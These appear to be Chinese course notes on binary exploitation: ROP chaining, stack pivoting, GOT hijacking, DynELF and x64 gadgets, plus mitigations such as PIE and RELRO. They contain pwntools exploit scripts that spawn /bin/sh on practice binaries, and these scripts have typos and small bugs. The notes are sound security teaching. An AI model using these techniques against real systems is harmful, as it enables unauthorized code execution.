# 长亭PWN笔记02

- ROP实战技巧之一：连接多个libc函数调用
- ROPP实战技巧之二：栈迁移(Stack Pivot)
- ROP案例详解
- x64下的ROP
- ROP和GOT表劫持相关缓解技术

## 回顾：栈布局

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163406.png)

## 回顾：Return to Libc

一次在栈上布置system、exit、binsh、0，即可连续调用system("/bin/sh")和exit(0)

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163511.png)

那如何串联3次或更多的libc函数调用？如果libc函数有2个以上的参数，如何不是ROP Payload？例如

```
read(fd,buf,size)
write(fd,buf,size)
```

DEMO代码：

```python
from pwn import *

elf = ELF("./ret2libc")
libc = elf.libc
io = process("./ret2libc")
pause()
io.recvuntil("This is your gift: ")
setvbuf_addr = int(io.recvline().strip(),16)
#libc.sym就是offset
libc_base = setvbuf_addr - libc.sym["setvbuf"]
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + libc.search("/bin/sh\x00").next()

pause()
log.info("setvbuf_addr:0x%x") % setvbuf_addr)
log.info("libc_base:0x%x") % libc_base)
log.info("system_addr:0x%x") % system_addr)
log.info("binsh_addr:0x%x") % binsh_addr)

pay = "A"*0x68 + "B"*4
pay += p32(system_addr)
pay += 'CCCC'
pay += p32(binsh_addr)

io.send(pay)

io.interactive()
```

## 连接多个libc函数调用

例如要连接`read(fd1,buf1,size1)`和`write(fd2,buf2,size2)`两个函数调用，无法按照`system("/bin/sh")`和`exit(0)`那样布置ROP Payload，参数会产生重叠

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164655.png)

使用`pop ret`这类的ROP Gadget可以解决这个问题，例如：

```
pop ebx ; pop esi ; pop edi ; ret ;
```

这种三个的gadget下文记为**pop3 ret**

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164912.png)

#### 偏移计算

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426165102.png)

## 栈迁移

- 定义
  - 通过一个修改esp寄存器的gadget来改变栈的位置
- 应用场景
  - 溢出长度较短，不够做ROP（例1）
  - 溢出载荷以0结尾，而gadget地址为0开头（例2）
  - 在泄露地址后，我们需要执行一个新的ROP链

例1：

```c
vodi stack_overflow(char *user)
{
	char dst[512];
	if (strlen(user)>536)
		return;
	//536-512 = 24 字节的溢出，太短！
    strcpy(dst,user);
}
```

例2：

```c
vodi stack_overflow(char *user){
    char dst[512]
    strcpy(dst,user);
}
x64 assembly
0x406113:	55			push	%rbp
0x406114:	41 89 d4	mov		%edx,%e12d
```

### add esp

将esp加上一个固定值的gadget我们称为“add esp”，例如：add esp，0x6c;ret;

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426112159.png)

### pop ebp ret + leave ret

- `pop ebp;ret;` + `leavel;ret;`两个gadget组合可以将esp改成任意值
- `pop ebp;ret;`可以将ebp改为任意值
- `leave = mov esp,ebp;pop ebp`因此ebp会存入esp，esp可以任意控制

### 利用

- 第一次ROP，泄露libc地址
  - 调用`write(1,write_got,4)`，泄露write函数地址，同方法1
  - 调用read(0,new_stack,ROP_len)，读取第二次ROP Payload到BSS段（新的栈）
  - 利用栈迁移`pop ebp ret`+`leave ret`，连接执行第二次ROP
  - 等待栈迁移触发第二次ROP执行，启动shell	

## GOT表劫持

#### 思路

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426135345.png)

- 上述方法中，我们需要执行两次ROP，第二次ROP Payload依赖第一次ROP泄露的地址，能否只用一次ROP就完成利用？
- 在ROP中通过Return To PLT调用read和write，实际上可以实现内存任意读写
- 因此，为了最终执行system()我们可以不使用ROP，而是使用GOT表劫持的方法：先通过ROP调用read，来修改wrtie函数的GOT表项，然后再次调用write，实际上此时调用的则是GOT表项被劫持后的值，例如system()

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426141137.png)

#### 详细步骤

- 使用一次ROP，完成libc地址泄露、GOT表劫持、命令字符串写入
  - 调用write(1,write_got,4)，泄露write函数地址
  - 调用read()，修改write()函数的GOT表项为system地址
  - 调用read(0,bss,len(cmd))，将命令字符串("/bin/sh")写入.bss Section
  - 调用write(cmd)，实际上调用的system(cmd)
- 读取泄露的write函数地址，计算system()地址
- 输入system()地址，修改write()函数的GOT表项
- 输入命令字符串"/bin/sh"，写入.bss Section
- 调用write(cmd)来运行system(cmd)

## 如果题目没有给予libc怎么办

- 从寻找我们需要的[libc_base](gttps://libc.blukat.me/)

- 使用DynELF

#### DynELF

- 原理：如果可以实现任意内存读，可以模拟`_dll_runtime_resolve`函数的行为来解析符号，这样的好处是无需知道libc。pwntools库中的DynELF模块已经实现了此功能
- 编写一个通用的任意内存泄露函数
  - 通过返回main()函数来允许内存泄露触发多次
- 将泄露函数传入DynELF来解析system()函数的地址
- 通过ROP来调用system("/bin/sh")
- 当目标的libc库未知时，DynELF非常有用

DEMO展示：

```python
from pwn import *
context(arch='i386',os='linux',endian='little',log_level='debug')
main = 0x80481D
bss = 0x8049700
elf = ELF("")
p = process("")
print "[+] PID: %s" % proc.pidof(p)
log.info("[+] system: %s" % hex(system))
#将栈溢出封装成ROP调用，方便多次触发
def do_rop(rop):
    payload = 'A' * (0x88 + 4)
    payload += rop
    p.send(payload)
#任意内存读函数，通过ROP调用write函数将任意地址内存读出，最后回到main，实现反复触发
def peek(addr):
    payload = 'A' * (0x88 + 4)
    rop = p32(elf.plt['write']) + p32(main) + p32(1) + p32(add) + p32(4)
    payload += rop
    p.send(payload)
    data = p.recv(4)
    return data
#任意内存写函数，通过ROP调用write函数将任意地址内存写入，最后回到main，实现反复触发
def poke(addr,data):
    payload = 'A' * (0x88 + 4)
    rop = p32(elf.plt['read']) + p32(main) + p32(0) + p32(add) + p32(len(data))
    payload += rop
    p.send(payload) 
    p.send(data)
#将任意内存泄露函数peek传入DynELF
d = DynELF(peek,elf=elf)
#DynELF模块可以实现任意库中的任意符号解析，例如system
system = d.lookup("system","libc.so")
log.info("[+] system: %s" % hex(system))
#将要执行的命令写入.bss Section
poke(bss,'/bin/sh\0')
#通过ROP运行system(cmd)
do_rop(p32(system) + p32(0xDEADBEEF) + p32(bss))
p.interactive()
```

## x64架构下的ROP

- amd64（64位）cdecl调用约定
  - 使用寄存器rdi、rsi、rdx、rcx、r8、r9来传递前6个参数
  - 第七个及以上的参数通过栈来传递
- 参数在寄存器中，必须用gadget来设置参数
  - pop rdi ; ret 
  - pop rsi ; pop r15 ; ret ;
  - 用gadget设置rdx和rcx寄存器就比较困难一点，没有例如pop ret这种特别直接的gadget

#### x64下通用Gadget

```c
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

几乎所有的x64 ELF在_libc_csu_init函数中存在上面两个Gadget，第二个Gadget可以设置r13、r14、r15，再通过一个Gadget将这三个值分别送入rdx、rsi、edi中，正好涵盖了x64 cdecl调用约定下的前三个参数

## One Gadget

通过OneGadget工具进行查找：https://github.com/david942j/one_gadget

通常执行system("/bin/sh")需要在调用system之前传递参数；

比较神奇的是，libc中包含一些gadget，直接跳转过去即可启动shell；

通常通过寻找字符串"/bin/sh"的引用来寻找（对着/bin/sh的地址在IDA Pro中按X）

## 如何防御ROP

- 位置无关代码（PIE）可防御攻击者直接ROP
  - 攻击者不知道代码地址
  - ROP与return to PLT技术无法直接使用
- PIE绕过方法
  - 结合信息泄露漏洞
  - x86_32架构下可爆破
    - 内存地址随机化粒度以页为单位：0x1000字节对齐

## 如何防御GOT表劫持

- 重定位只读(Relocation Read Only)缓解措施
  - 编译选项：gcc -z , relro
  - 在进入main()之前，所有的外部函数都会被解析
  - 所有GOT表设置为只读
  - 绕过方法
    - 劫持为开启该保护的动态库中的GOT表(例如libc中的GOT表)
    - 改写函数返回地址或函数指针